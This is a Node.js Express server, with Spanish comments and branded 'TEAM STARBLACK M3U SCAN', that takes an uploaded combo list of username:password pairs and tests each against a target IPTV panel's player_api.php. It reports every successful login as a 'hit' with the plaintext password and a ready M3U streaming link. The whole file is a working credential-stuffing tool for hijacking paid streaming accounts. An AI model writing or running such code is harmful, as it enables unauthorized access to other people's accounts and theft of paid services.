const express = require('express');
const multer = require('multer');
const cors = require('cors');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 10 * 1024 * 1024 }
});

// Función para probar una cuenta
async function testAccount(host, username, password) {
    const url = `http://${host}/player_api.php?username=${username}&password=${password}`;
    
    try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 10000);
        
        const response = await fetch(url, { signal: controller.signal });
        clearTimeout(timeout);
        
        if (!response.ok) return null;
        
        const data = await response.json();
        
        if (data && data.user_info && data.user_info.auth === 1) {
            return {
                username: data.user_info.username,
                status: data.user_info.status,
                exp_date: data.user_info.exp_date,
                max_connections: data.user_info.max_connections,
                active_cons: data.user_info.active_cons,
                created_at: data.user_info.created_at,
                live_streams: data.user_info.live_streams_count || 0,
                vod_streams: data.user_info.vod_streams_count || 0,
                series_count: data.user_info.series_count || 0,
                server_url: data.server_info?.url || host,
                server_port: data.server_info?.port || 80
            };
        }
        return null;
    } catch (error) {
        return null;
    }
}

// Formatear hit encontrado
function formatHit(data, host, username, password, nick) {
    const expDate = data.exp_date && data.exp_date > 0 
        ? new Date(data.exp_date * 1000).toLocaleDateString('es-ES')
        : 'UNLIMITED';
    
    const createdDate = data.created_at && data.created_at > 0
        ? new Date(data.created_at * 1000).toLocaleDateString('es-ES')
        : 'UNKNOWN';
    
    const realServer = `http://${data.server_url}:${data.server_port}`;
    const m3uLink = `http://${host}/get.php?username=${username}&password=${password}&type=m3u_plus`;
    
    return `
╔══════════════════════════════════════════════════════════════╗
║              🔥 TEAM STARBLACK M3U SCAN 🔥                   ║
╠══════════════════════════════════════════════════════════════╣
║ 🌐 HOST         ➠ http://${host}
║ 📡 REAL SERVER  ➠ ${realServer}
║ 📅 CREADA       ➠ ${createdDate}
║ ⏰ EXPIRA       ➠ ${expDate}
║ 👤 USUARIO      ➠ ${username}
║ 🔑 CONTRASEÑA   ➠ ${password}
║ 🔋 ESTADO       ➠ ${data.status || 'ACTIVE'}
║ 🔢 MAX CONEX    ➠ ${data.max_connections || 'N/A'}
║ 👥 CONEX ACT    ➠ ${data.active_cons || 0}
╠══════════════════════════════════════════════════════════════╣
║ 📺 CANALES      ➠ ${data.live_streams}
║ 🎬 PELICULAS    ➠ ${data.vod_streams}
║ 🎞️ SERIES       ➠ ${data.series_count}
╠══════════════════════════════════════════════════════════════╣
║ 🔗 M3U LINK     ➠ ${m3uLink}
╠══════════════════════════════════════════════════════════════╣
║ 🎯 HIT BY       ➠ ${nick}
║ 📆 FECHA        ➠ ${new Date().toLocaleDateString('es-ES')}
╚══════════════════════════════════════════════════════════════╝
`;
}

// Endpoint de escaneo
app.post('/api/scan', upload.single('comboFile'), async (req, res) => {
    console.log('\n🚀 NUEVO ESCANEO INICIADO');
    
    try {
        // Validar que llegó el archivo
        if (!req.file) {
            console.log('❌ No se recibió archivo');
            return res.status(400).json({ 
                success: false, 
                error: 'No se recibió el archivo de combos' 
            });
        }
        
        const host = req.body.host;
        const nick = req.body.nick || '@hacker056';
        
        if (!host) {
            return res.status(400).json({ 
                success: false, 
                error: 'Host es requerido' 
            });
        }
        
        // Leer combos
        const comboText = req.file.buffer.toString('utf-8');
        const lines = comboText.split(/\r?\n/);
        const combos = [];
        
        for (const line of lines) {
            const trimmed = line.trim();
            if (trimmed && trimmed.includes(':')) {
                const [user, pass] = trimmed.split(':');
                if (user && pass) {
                    combos.push({ user, pass });
                }
            }
        }
        
        console.log(`📊 Host: ${host}`);
        console.log(`📊 Combos a probar: ${combos.length}`);
        
        if (combos.length === 0) {
            return res.status(400).json({ 
                success: false, 
                error: 'No se encontraron combos válidos. Formato: usuario:contraseña' 
            });
        }
        
        const hits = [];
        let hitsCount = 0;
        let invalidCount = 0;
        
        // Probar cada combo
        for (let i = 0; i < combos.length; i++) {
            const { user, pass } = combos[i];
            console.log(`🔍 [${i + 1}/${combos.length}] Probando: ${user}`);
            
            const result = await testAccount(host, user, pass);
            
            if (result) {
                hitsCount++;
                const hitText = formatHit(result, host, user, pass, nick);
                hits.push(hitText);
                console.log(`✅ HIT #${hitsCount}: ${user}`);
            } else {
                invalidCount++;
                console.log(`❌ BAD: ${user}`);
            }
            
            // Pequeña pausa para no sobrecargar
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        console.log(`\n📊 RESUMEN:`);
        console.log(`✅ Hits: ${hitsCount}`);
        console.log(`❌ Bad: ${invalidCount}`);
        console.log(`📊 Total: ${combos.length}`);
        
        res.json({
            success: true,
            hits: hits,
            stats: {
                total: combos.length,
                hits: hitsCount,
                invalidos: invalidCount,
                testados: combos.length
            }
        });
        
    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Endpoint de prueba
app.get('/api/test', (req, res) => {
    res.json({ success: true, message: 'Servidor funcionando' });
});

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
    console.log(`
╔═══════════════════════════════════════╗
║   🔥 TEAM STARBLACK M3U SCAN 🔥       ║
║   Servidor corriendo en puerto: ${port}    ║
║   http://localhost:${port}              ║
╚═══════════════════════════════════════╝
    `);
});
